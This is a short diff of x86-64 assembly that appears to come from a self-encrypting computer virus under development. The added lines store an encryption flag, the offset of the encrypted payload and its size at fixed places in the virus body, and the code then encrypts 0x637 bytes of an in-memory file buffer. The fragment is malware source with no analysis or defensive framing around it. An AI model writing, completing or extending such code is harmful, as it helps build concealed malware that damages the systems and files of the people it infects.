@@ -168,7 +168,17 @@ _start:
     ; Set encrypted flag at virus_start + 24 = 0x13de
     mov byte [rdi], 1
     
-    ; Encrypt from decrypt_code.end (0x1532)
+    ; Write encrypted_offset at virus_start + 25 = 0x13df
+    ; Store as offset from virus_start, not absolute file offset
+    ; virus_start = 0x13c6, decrypt_code.end = 0x1532
+    ; offset_from_virus_start = 0x1532 - 0x13c6 = 0x16c
+    mov qword [rdi + 1], 0x16c
+    
+    ; Write encrypted_size at virus_start + 33 = 0x13e7
+    ; Size = 0x637 bytes
+    mov qword [rdi + 9], 0x637
+    
+    ; Encrypt from decrypt_code.end (0x1532) for 0x637 bytes
     lea rdi, [rel file_buffer]
     add rdi, 0x1532
     mov rsi, 0x637
